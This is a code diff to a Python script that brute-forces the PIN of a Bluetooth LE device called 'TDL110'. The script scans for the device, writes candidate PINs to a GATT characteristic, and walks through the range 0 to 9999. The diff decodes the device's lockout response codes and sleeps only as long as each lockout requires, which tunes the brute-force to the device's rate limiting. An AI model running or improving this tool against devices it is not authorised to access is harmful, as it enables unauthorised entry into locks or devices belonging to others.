@@ -12,13 +12,10 @@ Usage:
   # Step 1: Find the device address
   python tdl110_pin.py --scan
 
-  # Step 2: Pair / confirm connection and enumerate services
-  python tdl110_pin.py --address <UUID> --pair
-
-  # Step 3a: Test a single PIN
+  # Step 2: Test a single PIN
   python tdl110_pin.py --address <UUID> --pin 1234
 
-  # Step 3b: Brute-force a range
+  # Step 3: Brute-force a range
   python tdl110_pin.py --address <UUID> --brute --start 0 --end 9999
 """
 
@@ -32,7 +29,12 @@ SERVICE_UUID    = "5d5b1447-f938-4e72-ba34-624f902fa84f"
 PIN_CHAR_UUID   = "5d5b1447-f938-4e72-ba34-624f902fa85e"   # Write: send PIN here
 NOTIF_CHAR_UUID = "5d5b1447-f938-4e72-ba34-624f902fa851"   # Notify: response here
 
-INVALID_PIN_BYTE  = 0x1e   # Device responds 0x1e for a wrong PIN
+# Response codes from the device
+PIN_ACCEPTED       = 0x19  # PIN correct
+PIN_REJECTED       = 0x16  # Wrong PIN, retry immediately
+PIN_WAIT_5S        = 0x1d  # Wrong PIN, wait 5 seconds before retry
+PIN_WAIT_60S       = 0x1e  # Wrong PIN, wait 60 seconds before retry
+
 NOTIFICATION_TIMEOUT = 3.0  # seconds to wait for device response
 
 
@@ -104,10 +106,18 @@ async def test_pin(address: str, pin: str, verbose: bool = True) -> bool:
         return False
 
     raw = response_value[0] if response_value else b""
-    accepted = bool(raw) and raw[0] != INVALID_PIN_BYTE
+    code = raw[0] if raw else None
+    accepted = code == PIN_ACCEPTED
 
     if verbose:
-        status = "✅ ACCEPTED" if accepted else "❌ Rejected"
+        if accepted:
+            status = "✅ Accepted"
+        elif code == PIN_WAIT_60S:
+            status = "❌ Rejected, retry in 60 seconds"
+        elif code == PIN_WAIT_5S:
+            status = "❌ Rejected, retry in 5 seconds"
+        else:
+            status = "❌ Rejected, retry"
         print(f"  Response: {raw.hex(' ') or '(empty)'}  →  {status}")
 
     return accepted
@@ -151,15 +161,26 @@ async def brute_force(address: str, start: int, end: int, digits: int):
                     return None
 
                 raw = state["data"]
-                accepted = bool(raw) and raw[0] != INVALID_PIN_BYTE
-                status = "✅ ACCEPTED" if accepted else "❌ Rejected"
+                code = raw[0] if raw else None
+                accepted = code == PIN_ACCEPTED
+                if accepted:
+                    status = "✅ Accepted"
+                elif code == PIN_WAIT_60S:
+                    status = "❌ Rejected, retry in 60 seconds"
+                elif code == PIN_WAIT_5S:
+                    status = "❌ Rejected, retry in 5 seconds"
+                else:
+                    status = "❌ Rejected, retry"
                 print(f"  Response: {raw.hex(' ') or '(empty)'}  →  {status}")
 
                 if accepted:
                     print(f"\n🎉  PIN FOUND: {pin}")
                     return pin
 
-                await asyncio.sleep(62)
+                if code == PIN_WAIT_5S:
+                    await asyncio.sleep(5)
+                elif code == PIN_WAIT_60S:
+                    await asyncio.sleep(60)
 
     except Exception as e:
         print(f"❌ Connection failed: {e}")
